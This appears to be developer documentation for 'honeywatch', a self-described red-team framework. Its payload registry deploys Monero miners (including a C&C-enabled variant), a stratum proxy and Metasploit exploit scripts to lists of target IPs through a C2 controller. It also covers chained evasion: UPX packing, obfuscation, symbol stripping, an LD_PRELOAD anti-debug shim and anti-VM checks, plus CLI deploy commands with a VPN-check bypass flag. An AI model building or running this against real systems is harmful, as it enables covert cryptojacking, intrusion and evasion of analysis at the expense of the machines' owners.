# Payloads

`honeywatch/payloads/` — declarative registry of 10 red-team payloads (metadata + shell script templates). No malware is bundled; the generated manifest tells a worker how to fetch or build the tool on the target. Source: `payloads/registry.py:616`, `payloads/__init__.py:31`.

## Registry

```python
from honeywatch.payloads import registry, PAYLOAD_IDS, PAYLOAD_CATEGORIES, get_payload, list_payloads, by_category

print(PAYLOAD_IDS)        # ('xmrig', 'xmrigcc', 'stratum', 'metasploit', 'upx', 'packers', 'obfuscators', 'symbol_strip', 'anti_debug', 'anti_vm')
print(PAYLOAD_CATEGORIES) # ('evasion', 'exploit', 'miner')
print(by_category())      # {"miner": [Payload(...), ...], "exploit": [...], "evasion": [...]}

p = get_payload("xmrig")  # raises KeyError if unknown
miner_payloads = list_payloads(category="miner")
```

`registry: dict[str, Payload]` is built once at import time from `_payloads()` (`registry.py:590`). `PAYLOAD_IDS` and `PAYLOAD_CATEGORIES` are tuples derived from it.

## Payload Model

`honeywatch/models.py:84` `Payload`:

```python
@dataclass
class Payload:
    id: str
    category: str            # miner | exploit | evasion
    name: str
    description: str
    platforms: list[str] = field(default_factory=list)
    install_type: str = "script"  # script | binary | package | source | msf_module
    dependencies: list[str] = field(default_factory=list)
    config_schema: dict[str, Any] = field(default_factory=dict)  # required vars, defaults, types
    install_script: str = ""      # shell template with {{var|default('val')}}
    run_script: str | None = None
    artifacts: list[str] = field(default_factory=list)
    tags: list[str] = field(default_factory=list)
```

## All 10 Payloads

### `miner` category

| ID | Name | Install | Required vars | Purpose |
|---|---|---|---|---|
| `xmrig` | XMRig Monero CPU Miner | `binary` | `pool`, `wallet` | Open-source Monero (RandomX) CPU miner; fetches static build from `github.com/xmrig/xmrig`, writes `config.json`, runs `./xmrig -c config.json` |
| `xmrigcc` | XMRigCC Miner with C&C | `binary` | `cc_server`, `pool`, `wallet` | Variant with built-in C&C client; fetches `xmrigCC` from `github.com/Bendr0id/xmrigCC`, writes `xmrigcc_client.json` |
| `stratum` | Stratum Proxy | `script` | `upstream_pool` | Minimal TCP stratum proxy (pure stdlib Python); listens on `listen` (default `0.0.0.0:3333`), pipes `select`-based between miners and upstream |

Optional vars for miners: `pass`/`worker`/`threads`/`tls`/`run_user`/`install_dir`/`arch`. Artifacts: `config.json`/`xmrig`, `xmrigcc_client.json`/`xmrigCCClient`, `stratum_proxy.py`/`run.sh`.

### `exploit` category

| ID | Name | Install | Required vars | Purpose |
|---|---|---|---|---|
| `metasploit` | Metasploit Framework | `package` | none (optional `target_range`, `resource_script`) | Rapid7 Metasploit via nightly `msfinstall` or `apt`/`dnf`; stages `ssh_enum.rc` and `exploit.rc` |

### `evasion` category

| ID | Name | Install | Required vars | Purpose |
|---|---|---|---|---|
| `upx` | UPX Packer | `binary` | `input_file` | Ultimate Packer for eXecutables; fetches `upx` from `github.com/upx/upx`, runs `upx --best -o /tmp/packed <input>` |
| `packers` | Generic ELF Packer Harness | `script` | `input_file` | Shell self-extracting stub: `gzip -9` + `xxd`/`base64` + appended `__ARCHIVE__`, installed as `hw-pack` |
| `obfuscators` | Script String Obfuscator | `script` | `input_file` | Python helper that replaces `"string"` literals with `chr()` concatenation; installed as `hw-obfuscate` |
| `symbol_strip` | Symbol Stripper | `script` | `input_file` | Copies ELF then `strip --strip-all`; installed as `hw-strip` |
| `anti_debug` | Anti-Debug Shim | `source` | `target_command` | C `ptrace(PTRACE_TRACEME)` constructor shim, compiled to `anti_debug.so` via `gcc -shared -fPIC`; `LD_PRELOAD=.../anti_debug.so <cmd>` |
| `anti_vm` | Anti-VM Checker | `script` | none | Shell harness that greps `dmesg`/`/proc/cpuinfo`/`/sys/class/dmi/id/*` for `hypervisor`/`vmware`/`virtualbox`/`kvm`/`qemu`/`xen`/`hyper-v`; exits 1 if VM detected |

Each payload's `install_script` is `_PREAMBLE` + body (`registry.py:12` `_PREAMBLE` sets `set -e`, `LOG`, `tee`). Templates use `{{var}}` and `{{var|default('val')}}` (see Scripts).

## Example Config Schemas

`xmrig` (`registry.py:393`):

```python
{
  "pool": {"type": "string", "required": True},
  "wallet": {"type": "string", "required": True},
  "pass": {"type": "string", "required": False, "default": "x"},
  "worker": {"type": "string", "required": False, "default": "honeywatch"},
  "threads": {"type": "integer", "required": False, "default": 0},
  "tls": {"type": "boolean", "required": False, "default": False},
  "run_user": {"type": "string", "required": False, "default": "root"},
  "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
  "arch": {"type": "string", "required": False, "default": "linux-x64"},
}
```

## Scripts Engine (`payloads/scripts.py`)

`honeywatch/payloads/scripts.py:100` — tiny regex Jinja-less engine.

```python
from honeywatch.payloads.scripts import render_payload_script, validate_variables, merge_defaults, render_manifest_scripts, generate_operation_id

errors = validate_variables(payload, {"pool": "stratum+tcp://..."})  # ["missing required: wallet"]
merged = merge_defaults(payload, {"pool": "...", "wallet": "..."})   # fills defaults
script = render_payload_script(payload, merged, target)              # injects IDs + renders {{vars}} + appends run_script
scripts = render_manifest_scripts(manifest)  # dict[str, str] per-ip
op_id = generate_operation_id()              # "hw-" + random 10 hex
```

- `_TOKEN_RE = \{\{\s*([a-zA-Z_]\w*)\s*(?:\|\s*default\(['\"]?([^)'\"]*)['\"]?\))?\s*\}\}` — matches `{{var}}` and `{{var|default('val')}}`.
- `_render_template(template, variables, strict=False) -> str` — replaces tokens; `strict=True` keeps unknown tokens.
- `_inject_ids(script, payload_id, target) -> str` — prepends `op_id` (12 hex chars), `payload_id`, `target_ip`/`port`.
- `render_payload_script(payload, variables, target)` — inject ids + render + append `run_script`.
- `validate_variables(payload, variables) -> list[str]` — checks `config_schema` required.
- `merge_defaults(payload, variables) -> dict` — fills schema defaults.
- `render_manifest_scripts(manifest) -> dict[str, str]` — per-host scripts.

## Evasion Chaining

`honeywatch/ops/deploy.py:192` `_wrap_with_evasion`:

Order when `apply_evasion = ["upx","symbol_strip","anti_vm"]`:

1. `anti_vm` first (VM check, exits 1 if VM)
2. Main payload script
3. Packers/strippers: `upx`, `packers`, `symbol_strip` — each rendered via `_render_evasion_for_payload` targeting `"/opt/honeywatch/{payload.id}/{artifact0}"`, substituting `input_file`/`output_file`/`install_dir`
4. `anti_debug` last (`LD_PRELOAD` wrapper around the final command)

Controlled by `--evasion` flag or `payloads.default_evasion` (`["upx","symbol_strip"]`).

## CLI

```bash
honeywatch deploy xmrig --var pool=stratum+tcp://pool:3333 --var wallet=W --dry-run --skip-vpn-check
honeywatch deploy stratum --var upstream_pool=pool:3333 --target-file targets.txt --dry-run --skip-vpn-check
honeywatch deploy xmrig --evasion upx,symbol_strip,anti_vm --var pool=... --var wallet=... --skip-vpn-check
```

See [Ops & Targeting](ops.md) for `build_manifest`/`enqueue_operation`.

## Tags

Each payload lists `tags` (e.g. `["miner","monero","cpu"]`) for filtering via `by_category` or custom logic.

## See Also

- [Ops & Targeting](ops.md) — `TargetFilter`, `select_targets`, manifest building
- [C2 Controller](c2.md) — how manifests become `WorkerTask` rows
- [API — Payloads](api/payloads.md)
